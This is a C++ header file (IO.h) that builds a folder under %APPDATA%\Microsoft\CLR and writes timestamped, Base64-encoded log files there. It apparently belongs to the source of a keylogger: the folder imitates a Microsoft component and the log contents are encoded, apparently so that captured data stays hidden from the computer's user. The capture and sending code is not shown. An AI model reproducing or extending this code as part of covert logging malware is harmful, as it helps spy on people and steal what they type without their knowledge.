#ifndef IO_H
#define IO_H


#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO {

	/*
		IO Subfunctions
	*/

	std::string GetOurPath(const bool append_seperator = false) {
		std::string appdata_dir(getenv("APPDATA"));
		std::string full_dir = appdata_dir + "\\Microsoft\\CLR" + (append_seperator ? "\\" : "");
		return full_dir;
	}

	//checks if the creation of the directory is successful or if it already exists
	bool createOneDir(std::string path) {
		return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	//creates full dir
	bool createFullDir(std::string path) {
		for (char& c : path) {
			if (c == '\\') {
				c = '\0';

				if (!createOneDir(path)) {
					return false;
				}

				c = '\\';
			}
		}
		return true;
	}

	/*
		IO function
		Writes logs registering them using the DateTime Struct on Helper
		File Name: DateTime + .log extension
		Format: [DateTime]
				
	*/

	template <class T>
	std::string WriteLog(const T& t) {
		std::string path = GetOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";

		try {
			std::ofstream file(path + name);
			if (!file) {
				return "err";
			}
			std::ostringstream outputss;
			outputss << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
			std::string data = Base64::EncryptB64(outputss.str());
			file << data;
			if (!file) {
				return "err";
			}
			file.close();
			return name;
		}
		catch (...) {
			return "err";
		}
	}


}

#endif // ! IO_H

